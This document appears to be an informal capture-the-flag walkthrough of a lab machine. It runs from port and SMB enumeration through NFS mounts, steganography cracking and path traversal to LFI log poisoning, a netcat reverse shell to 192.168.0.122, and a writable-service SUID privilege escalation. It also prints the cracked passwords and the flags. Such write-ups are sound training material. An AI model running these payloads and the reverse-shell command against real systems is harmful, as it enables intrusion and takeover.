
Target_ IP = 192.168.0.106 

## Recon 
```sql 
Nmap scan 
Discovered open port 139/tcp on 192.168.0.106
Discovered open port 111/tcp on 192.168.0.106
Discovered open port 445/tcp on 192.168.0.106
Discovered open port 80/tcp on 192.168.0.106
Discovered open port 53963/tcp on 192.168.0.106


PORT     STATE SERVICE     VERSION
80/tcp   open  http        nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Apache2 Debian Default Page: It works
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37553/tcp6  mountd
|   100005  1,2,3      38653/udp   mountd
|   100005  1,2,3      49803/udp6  mountd
|   100005  1,2,3      50149/tcp   mountd
|   100021  1,3,4      39056/udp   nlockmgr
|   100021  1,3,4      39901/tcp   nlockmgr
|   100021  1,3,4      42819/tcp6  nlockmgr
|   100021  1,3,4      44689/udp6  nlockmgr
|   100024  1          33046/udp   status
|   100024  1          33713/tcp6  status
|   100024  1          37917/tcp   status
|   100024  1          53833/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs_acl     3 (RPC #100227)

Host script results:
| smb2-time: 
|   date: 2024-03-23T08:19:49
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

```

smb enumeration 

```sql 
 ============================== 
|    Users on 192.168.0.106    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: hermanubis	Name: 	Desc: 

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[hermanubis] rid:[0x3
					
========================================== 
|    Share Enumeration on 192.168.0.106    |
 ========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      New Jerusalem Public
	hermanubis      Disk      Hermanubis share
	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)

S-1-22-1-1000 Unix User\talos (Local User)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-22-1-1001 Unix User\byron (Local User)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-22-1-1002 Unix User\hermanubis (Local User)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-22-1-1003 Unix User\melville (Local User)

```

lets look at the files

```sql 
file found  in public smb share 

loyalty.txt
new_era.txt 
stranton.txt
2257686f2061726520796f752c207468656e3f22
```

they just a waste of time 
lets check on the mounts rfc-bind 

```sql 
showmount -e 192.168.0.106
Export list for 192.168.0.106:
/var/backups *
/home/byron  *


```

mount byron directory 
found two files memory.txt and mayor.txt 
which have this: ```Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem``` 

- create a user with UID 54 
- access the backups dir 
- then cat out all the txt files 
- convert the hex file to strings: **xxd -ps -r all.txt  | strings**
found password for hermanubis share: **ByronIsAsshole**

after login into the smb share 

```sql 
smbclient //192.168.0.106/hermanubis -u hermanubis 

smb: \> ls
  .                                   D        0  Tue Nov 28 14:44:44 2023
  ..                                  D        0  Wed Nov 29 01:13:50 2023
  index.html                          N      346  Tue Nov 28 14:44:41 2023
  prometheus.jpg                      N   307344  Tue Nov 28 17:23:24 2023

```

- get that and open it nothing intresting  
- then stegseek 
- 
 ```sql 
 stegseek prometheus.jpg ~/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "soldierofanubis"  
[i] Original filename: "secret.txt".
[i] Extracting to "prometheus.jpg.out".
``` 

- cat prometheus.jpg.out

```sql 
I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
```

- added to etc/hosts 

```sql
gobuster 
http://thetruthoftalos.hmv/index.php 
http://thetruthoftalos.hmv/index.html
http://thetruthoftalos.hmv/uploads 
```

- directory file trivasal
```sql 
payload 
....//....//....//....//....//....//....//....//....//....//....//etc/passwd 

what we got 

<div class="content"><h2>Content of ../../../../../../../../../../../etc/passwd:</h2><pre>root:x:0:0:root:/root:/bin/bash 
```

- lets try LFI log poisoning 
- revershell 
 - vulnerability is very easy to exploit, we will simply send a request to the web with the **`User-Agent`** modified by a small  **`script`** in **`PHP`**, this, once we load the file, will be executed. 
 - **` curl http://thetruthoftalos.hmv/REVERSE_SHELL -H "User-Agent: <?php exec('nc -e /bin/bash 192.168.0.122 4444')  ?>" `** as payload 
- then 
- run **`nc -lnvp 4444`** and run **`curl http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.log`** 

- have shell su as hermanubis with passwd as ByronIsAsshole 
- found files 
```sql 
investigation.txt
share
user.txt
------
user.txt = 				...',;;:cccccccc:;,..
                            ..,;:cccc::::ccccclloooolc;'.
                         .',;:::;;;;:loodxk0kkxxkxxdocccc;;'..
                       .,;;;,,;:coxldKNWWWMMMMWNNWWNNKkdolcccc:,.
                    .',;;,',;lxo:...dXWMMMMMMMMNkloOXNNNX0koc:coo;.
                 ..,;:;,,,:ldl'   .kWMMMWXXNWMMMMXd..':d0XWWN0d:;lkd,
               ..,;;,,'':loc.     lKMMMNl. .c0KNWNK:  ..';lx00X0l,cxo,.
             ..''....'cooc.       c0NMMX;   .l0XWN0;       ,ddx00occl:.
           ..'..  .':odc.         .x0KKKkolcld000xc.       .cxxxkkdl:,..
         ..''..   ;dxolc;'         .lxx000kkxx00kc.      .;looolllol:'..
        ..'..    .':lloolc:,..       'lxkkkkk0kd,   ..':clc:::;,,;:;,'..
        ......   ....',;;;:ccc::;;,''',:loddol:,,;:clllolc:;;,'........
            .     ....'''',,,;;:cccccclllloooollllccc:c:::;,'..
                    .......'',,,,,,,,;;::::ccccc::::;;;,,''...
                      ...............''',,,;;;,,''''''......
                           ............................

CONGRATULATIONS!

The flag is:
&5Wvtd!84S6JSMeH
----------
investigation.txt = I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...' 
--------
```

- system users  **`byron  city  hermanubis  melville  talos`**  
-  do some username brute-forcing with subf.sh  using the hex data we found before 
-  brute-forced found passwod = ` melville  1bd5528b6def9812acba8eb21562c3ec ` 
- su as melville and found a not `Don't touch SUID, it is very DANGEROUS`
- nothing instresting 
## Privilege Escalation 

```sql 
sudo -l 
Matching Defaults entries for hermanubis on principle2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty
User hermanubis may run the following commands on principle2:
    (talos) NOPASSWD: /usr/bin/cat


```

- cat doesn't work so linpeash.sh will 
-  run that 
```sql
 /etc/systemd/system/activity.service is calling this writable executable: /usr/local/share/report 

```

- create a file name as report as add the add the following into it 
```bash 
#!/bin/bash 

chmod u+s report 
```

- give write permission `chmod +x report` 
-  copy to `cp report /usr/local/share/report ` 
- run `ls -la /bin/bash`  see if has root privileges 
- run `bash -p` 
- and yeah root 
```sql 
melville@principle2:~$ bash -p
bash -p
bash-5.2# 
cat /root/root.txt 


⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀


CONGRATULATIONS hacker!!

The flag is:
YTY9wenm6TT8dgJ&

```